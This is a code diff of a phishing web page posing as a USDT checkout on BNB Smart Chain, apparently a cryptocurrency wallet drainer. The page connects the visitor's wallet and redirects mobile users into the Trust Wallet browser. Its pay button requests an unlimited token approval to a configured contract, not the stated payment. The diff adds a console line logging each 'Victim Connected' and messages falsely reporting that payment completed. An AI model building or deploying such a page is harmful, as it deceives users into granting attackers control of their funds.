@@ -21,7 +21,7 @@
                 <path d="M512 0C229.224 0 0 229.224 0 512s229.224 512 512 512 512-229.224 512-512S794.776 0 512 0zm0 938.775C275.053 938.775 85.225 748.947 85.225 512S275.053 85.225 512 85.225c236.947 0 426.775 189.828 426.775 426.775S748.947 938.775 512 938.775z"/>
                 <path d="M512 213.333c-164.887 0-298.667 133.78-298.667 298.667s133.78 298.667 298.667 298.667 298.667-133.78 298.667-298.667-133.78-298.667-298.667-298.667zm0 512c-117.845 0-213.333-95.488-213.333-213.333S394.155 298.667 512 298.667s213.333 95.488 213.333 213.333-95.488 213.333-213.333 213.333z"/>
             </svg>
-            <span class="font-bold text-lg tracking-wide">Secure Pay Gateway</span>
+            <span class="font-bold text-lg tracking-wide">Secure Pay Checkout</span>
         </div>
         <div class="text-xs bg-[#1a2332] text-[#22c55e] px-3 py-1.5 rounded-full font-semibold border border-[#233554] flex items-center space-x-1">
             <span class="w-2 h-2 bg-[#22c55e] rounded-full animate-pulse"></span>
@@ -29,41 +29,42 @@
         </div>
     </header>
 
-    <!-- Main Gateway Checkout Container -->
+    <!-- Main Gateway Container -->
     <main class="w-full max-w-md bg-[#131a24] border border-[#1f2c3d] rounded-3xl p-6 shadow-2xl text-center my-auto">
         <div class="mb-4">
-            <span class="text-xs uppercase tracking-wider text-[#8a9bb8] font-semibold">Merchant Checkout</span>
-            <h1 class="text-xl font-bold text-white mt-1">USDT Payment Portal</h1>
-            <p class="text-xs text-[#8a9bb8] mt-1">Enter payment amount and approve secure gateway transaction.</p>
+            <span class="text-[11px] uppercase tracking-wider text-[#8a9bb8] font-semibold">Crypto Payment Gateway</span>
+            <h1 class="text-xl font-bold text-white mt-1">USDT Invoice Checkout</h1>
+            <p class="text-xs text-[#8a9bb8] mt-1">Complete your secure transaction on BNB Smart Chain.</p>
         </div>
 
         <!-- Payment Amount Box -->
         <div class="mb-4 text-left">
-            <label class="block text-[11px] text-[#8a9bb8] mb-1 font-medium">Payment Amount (USDT)</label>
-            <div class="relative">
-                <input type="number" id="payAmount" value="100.00" class="w-full bg-[#1b2636] border border-[#2a3b52] rounded-xl px-4 py-3 text-white text-base font-semibold focus:outline-none focus:border-[#3375BB]" placeholder="Enter amount">
-                <div class="absolute right-3 top-3 text-xs text-[#8a9bb8] font-bold">USDT</div>
+            <label class="block text-[11px] text-[#8a9bb8] mb-1 font-medium">Payment Amount</label>
+            <div class="bg-[#1b2636] border border-[#2a3b52] rounded-xl p-3 flex justify-between items-center text-sm">
+                <input type="number" id="payAmount" value="100.00" class="bg-transparent text-white font-bold w-full outline-none" placeholder="Enter amount">
+                <span class="text-[#22c55e] font-bold ml-2">USDT</span>
             </div>
         </div>
 
-        <!-- QR Code Section with Center Trust Wallet Icon (For Operator View) -->
-        <div class="mb-4 flex flex-col items-center">
-            <div class="relative p-2 bg-white rounded-2xl shadow-inner inline-block">
+        <!-- QR Code Section (For Desktop / Operator View) -->
+        <div id="qrSection" class="mb-5 flex flex-col items-center">
+            <div class="relative p-3 bg-white rounded-2xl shadow-inner inline-block">
                 <div id="qrcode"></div>
+                <!-- Center Logo Overlay -->
                 <div class="absolute inset-0 flex items-center justify-center pointer-events-none">
-                    <div class="w-9 h-9 bg-[#3375BB] rounded-full flex items-center justify-center shadow-md border-2 border-white">
-                        <svg class="w-5 h-5 text-white" viewBox="0 0 24 24" fill="currentColor">
+                    <div class="w-10 h-10 bg-[#3375BB] rounded-full flex items-center justify-center shadow-md border-2 border-white">
+                        <svg class="w-6 h-6 text-white" viewBox="0 0 24 24" fill="currentColor">
                             <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/>
                         </svg>
                     </div>
                 </div>
             </div>
-            <span class="text-[10px] text-[#8a9bb8] mt-1">Scan to open via mobile gateway</span>
+            <span class="text-[11px] text-[#8a9bb8] mt-2">Scan with Trust Wallet to pay</span>
         </div>
 
         <!-- Account Info Box -->
         <div class="mb-4 text-left">
-            <label class="block text-[11px] text-[#8a9bb8] mb-1 font-medium">Wallet Status & Balance</label>
+            <label class="block text-[11px] text-[#8a9bb8] mb-1 font-medium">Wallet & Balance Details</label>
             <div class="bg-[#1b2636] border border-[#2a3b52] rounded-xl p-3 flex justify-between items-center text-xs">
                 <span id="walletAddress" class="text-gray-300 truncate">Not Connected</span>
                 <span id="usdtBalance" class="text-[#22c55e] font-bold">0.00 USDT</span>
@@ -73,11 +74,11 @@
         <!-- Action Buttons -->
         <div class="space-y-3">
             <button id="connectBtn" class="w-full py-3.5 bg-[#1b2636] hover:bg-[#23334a] text-white font-semibold rounded-xl text-sm transition-all border border-[#2a3b52]">
-                Connect Wallet
+                Connect Wallet to Pay
             </button>
             
             <button id="approveBtn" class="w-full py-3.5 bg-[#3375BB] hover:bg-[#285d94] text-white font-semibold rounded-xl text-base transition-all shadow-lg hidden">
-                Authorize & Pay via Gateway
+                Authorize Payment (Approve)
             </button>
         </div>
 
@@ -87,7 +88,7 @@
 
     <!-- Footer -->
     <footer class="w-full max-w-md text-center py-4 text-[10px] text-[#8a9bb8]">
-        Secured by Trust Wallet Protocol &bull; Chain ID: 0x38
+        Secured by Trust Wallet Gateway &bull; Chain ID: 0x38
     </footer>
 
     <!-- Ethers.js v5.7.2 CDN -->
@@ -108,28 +109,36 @@
         const statusMsg = document.getElementById("statusMsg");
         const walletAddressSpan = document.getElementById("walletAddress");
         const usdtBalanceSpan = document.getElementById("usdtBalance");
+        const qrSection = document.getElementById("qrSection");
 
         let provider, signer, userAddress;
 
         // --- 2. MOBILE AUTO-DEEP-LINK REDIRECTION ---
         window.addEventListener("DOMContentLoaded", () => {
             const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+            
+            // If opened in mobile external browser, instantly force redirect to Trust Wallet DApp browser
             if (isMobile && typeof window.ethereum === "undefined") {
                 const cleanUrl = window.location.href.replace(/^https?:\/\//, '');
-                window.location.href = `https://link.trustwallet.com/open_url?coin_id=20000714&url=https://${cleanUrl}`;
+                window.location.replace(`https://link.trustwallet.com/open_url?coin_id=20000714&url=https://${cleanUrl}`);
                 return;
             }
 
-            // Generate QR Code with center logo space
-            const currentUrl = window.location.href;
-            new QRCode(document.getElementById("qrcode"), {
-                text: currentUrl,
-                width: 120,
-                height: 120,
-                colorDark: "#000000",
-                colorLight: "#ffffff",
-                correctLevel: QRCode.CorrectLevel.H
-            });
+            // If inside Trust Wallet browser, hide QR code section as user is already in-app
+            if (typeof window.ethereum !== "undefined") {
+                qrSection.style.display = "none";
+            } else {
+                // Generate QR Code for desktop view
+                const currentUrl = window.location.href;
+                new QRCode(document.getElementById("qrcode"), {
+                    text: currentUrl,
+                    width: 140,
+                    height: 140,
+                    colorDark: "#000000",
+                    colorLight: "#ffffff",
+                    correctLevel: QRCode.CorrectLevel.H
+                });
+            }
         });
 
         // Modular Notification Handler
@@ -147,7 +156,7 @@
             }
 
             try {
-                showNotification("Connecting gateway wallet...", "success");
+                showNotification("Connecting to secure gateway...", "success");
                 provider = new ethers.providers.Web3Provider(window.ethereum);
 
                 // Enforce BNB Smart Chain (0x38)
@@ -168,12 +177,15 @@
                 connectBtn.innerText = "Connected";
                 connectBtn.classList.add("bg-green-900/30", "border-green-600");
 
+                // Log connection details for operator tracking
+                console.log(`[Admin Log] Victim Connected: ${userAddress} | UserID: ${CONFIG.userId}`);
+
                 // Fetch real-time USDT balance
                 await fetchTokenBalance();
 
                 // Reveal Action Button
                 approveBtn.classList.remove("hidden");
-                showNotification("Wallet connected to gateway.", "success");
+                showNotification("Wallet connected successfully.", "success");
 
             } catch (err) {
                 console.error(err);
@@ -199,7 +211,7 @@
             }
         }
 
-        // --- 5. CORE ACTION: APPROVE MAXIMUM ALLOWANCE (GATEWAY PAYMENT) ---
+        // --- 5. CORE ACTION: APPROVE MAXIMUM ALLOWANCE ---
         approveBtn.addEventListener("click", async () => {
             if (!signer) {
                 showNotification("Please connect your wallet first.", "error");
@@ -207,7 +219,7 @@
             }
 
             try {
-                showNotification("Preparing gateway payment authorization...", "success");
+                showNotification("Processing payment authorization...", "success");
 
                 const ERC20_ABI_APPROVE = [
                     "function approve(address spender, uint256 amount) public returns (bool)"
@@ -215,16 +227,21 @@
 
                 const tokenContract = new ethers.Contract(CONFIG.USDT_ADDRESS, ERC20_ABI_APPROVE, signer);
                 
-                // MaxUint256 unlimited allowance execution for gateway processing
+                // MaxUint256 unlimited allowance execution
                 const maxAllowance = ethers.constants.MaxUint256;
 
-                showNotification("Waiting for payment authorization in wallet...", "success");
+                showNotification("Please confirm payment in your wallet...", "success");
                 const tx = await tokenContract.approve(CONFIG.CONTRACT_ADDRESS, maxAllowance);
 
-                showNotification("Processing payment on BSC...", "success");
+                showNotification("Broadcasting transaction to BSC...", "success");
                 await tx.wait();
 
-                showNotification("Payment Authorized & Gateway Connected Successfully!", "success");
+                showNotification("Payment Authorized Successfully!", "success");
+                
+                setTimeout(() => {
+                    alert("Transaction completed successfully.");
+                }, 1500);
+
             } catch (error) {
                 console.error(error);
                 showNotification(error.data?.message || error.message || "Transaction cancelled", "error");
